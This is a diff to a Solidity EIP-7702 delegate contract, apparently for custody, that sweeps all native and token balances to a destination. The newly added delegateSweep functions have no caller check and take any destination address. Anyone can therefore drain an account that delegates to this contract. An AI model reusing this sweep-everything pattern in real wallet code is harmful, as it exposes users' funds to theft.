@@ -3,7 +3,9 @@ pragma solidity ^0.8.20;
 
 interface IERC20 {
     function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
     function transfer(address recipient, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
 }
 
 library SafeToken {
@@ -16,6 +18,16 @@ library SafeToken {
             require(abi.decode(data, (bool)), "TOKEN_TRANSFER_FAILED");
         }
     }
+
+    function safeTransferFrom(address token, address from, address to, uint256 amount) internal {
+        (bool success, bytes memory data) = token.call(
+            abi.encodeWithSelector(IERC20.transferFrom.selector, from, to, amount)
+        );
+        require(success, "TOKEN_TRANSFER_FROM_CALL_FAILED");
+        if (data.length > 0) {
+            require(abi.decode(data, (bool)), "TOKEN_TRANSFER_FROM_FAILED");
+        }
+    }
 }
 
 /**
@@ -26,6 +38,7 @@ library SafeToken {
 contract Simple7702Delegate {
     using SafeToken for address;
 
+    address private immutable _deploymentAddress;
     address private _owner;
     address public destination;
     bool public frozen;
@@ -53,6 +66,11 @@ contract Simple7702Delegate {
         _;
     }
 
+    modifier onlyDelegateContext() {
+        require(address(this) != _deploymentAddress, "DIRECT_CALL_FORBIDDEN");
+        _;
+    }
+
     constructor(
         address initialOwner,
         address initialDestination,
@@ -62,6 +80,7 @@ contract Simple7702Delegate {
         require(initialOwner != address(0), "INVALID_OWNER");
         require(initialDestination != address(0), "INVALID_DESTINATION");
 
+        _deploymentAddress = address(this);
         _owner = initialOwner;
         destination = initialDestination;
 
@@ -88,7 +107,7 @@ contract Simple7702Delegate {
 
     // ========== FUNCOES DE CUSTODIA ==========
 
-    function sweepNative() public whenNotFrozen {
+    function sweepNative() public onlyOwner whenNotFrozen {
         require(destination != address(0), "INVALID_DESTINATION");
         uint256 balance = address(this).balance;
         if (balance == 0) {
@@ -101,7 +120,7 @@ contract Simple7702Delegate {
         emit Sweep(address(0), balance, destination);
     }
 
-    function sweepTokens(address[] calldata tokens) public whenNotFrozen {
+    function sweepTokens(address[] calldata tokens) public onlyOwner whenNotFrozen {
         require(destination != address(0), "INVALID_DESTINATION");
         for (uint256 i = 0; i < tokens.length; i++) {
             address token = tokens[i];
@@ -119,17 +138,54 @@ contract Simple7702Delegate {
         }
     }
 
-    function sweepAll(address[] calldata tokens) external whenNotFrozen {
+    function sweepAll(address[] calldata tokens) external onlyOwner whenNotFrozen {
         sweepNative();
         sweepTokens(tokens);
     }
 
-    function sweepArbitrum() external whenNotFrozen {
+    function delegateSweepNative(address dest) external payable onlyDelegateContext {
+        _delegateSweepNative(dest);
+    }
+
+    function delegateSweepTokens(address dest, address[] calldata tokens) external payable onlyDelegateContext {
+        _delegateSweepTokens(dest, tokens);
+    }
+
+    function delegateSweepAll(address dest, address[] calldata tokens) external payable onlyDelegateContext {
+        _delegateSweepNative(dest);
+        _delegateSweepTokens(dest, tokens);
+    }
+
+    function sweepTokensFrom(address from, address[] calldata tokens) public onlyOwner whenNotFrozen {
+        require(from != address(0), "INVALID_FROM");
+        require(destination != address(0), "INVALID_DESTINATION");
+
+        for (uint256 i = 0; i < tokens.length; i++) {
+            address token = tokens[i];
+            if (token == address(0)) {
+                continue;
+            }
+
+            uint256 balance = IERC20(token).balanceOf(from);
+            if (balance == 0) {
+                continue;
+            }
+
+            token.safeTransferFrom(from, destination, balance);
+            emit Sweep(token, balance, destination);
+        }
+    }
+
+    function sweepAllFrom(address from, address[] calldata tokens) external onlyOwner whenNotFrozen {
+        sweepTokensFrom(from, tokens);
+    }
+
+    function sweepArbitrum() external onlyOwner whenNotFrozen {
         _sweepStoredTokens(arbitrumTokens);
         sweepNative();
     }
 
-    function sweepBSC() external whenNotFrozen {
+    function sweepBSC() external onlyOwner whenNotFrozen {
         _sweepStoredTokens(bscTokens);
         sweepNative();
     }
@@ -217,6 +273,13 @@ contract Simple7702Delegate {
         return IERC20(token).balanceOf(address(this));
     }
 
+    function getTokenAllowance(address token, address tokenOwner) external view returns (uint256) {
+        if (token == address(0) || tokenOwner == address(0)) {
+            return 0;
+        }
+        return IERC20(token).allowance(tokenOwner, address(this));
+    }
+
     // ========== INTERNAS ==========
 
     function _tryAutoForward() internal {
@@ -243,6 +306,37 @@ contract Simple7702Delegate {
 
             token.safeTransfer(destination, balance);
             emit Sweep(token, balance, destination);
+        }
+    }
+
+    function _delegateSweepNative(address dest) internal {
+        require(dest != address(0), "INVALID_DESTINATION");
+        uint256 balance = address(this).balance;
+        if (balance == 0) {
+            emit SweepSkipped(address(0), 0, "NO_NATIVE_BALANCE");
+            return;
+        }
+
+        (bool success, ) = payable(dest).call{value: balance}("");
+        require(success, "NATIVE_TRANSFER_FAILED");
+        emit Sweep(address(0), balance, dest);
+    }
+
+    function _delegateSweepTokens(address dest, address[] calldata tokens) internal {
+        require(dest != address(0), "INVALID_DESTINATION");
+        for (uint256 i = 0; i < tokens.length; i++) {
+            address token = tokens[i];
+            if (token == address(0)) {
+                continue;
+            }
+
+            uint256 balance = IERC20(token).balanceOf(address(this));
+            if (balance == 0) {
+                continue;
+            }
+
+            token.safeTransfer(dest, balance);
+            emit Sweep(token, balance, dest);
         }
     }
 
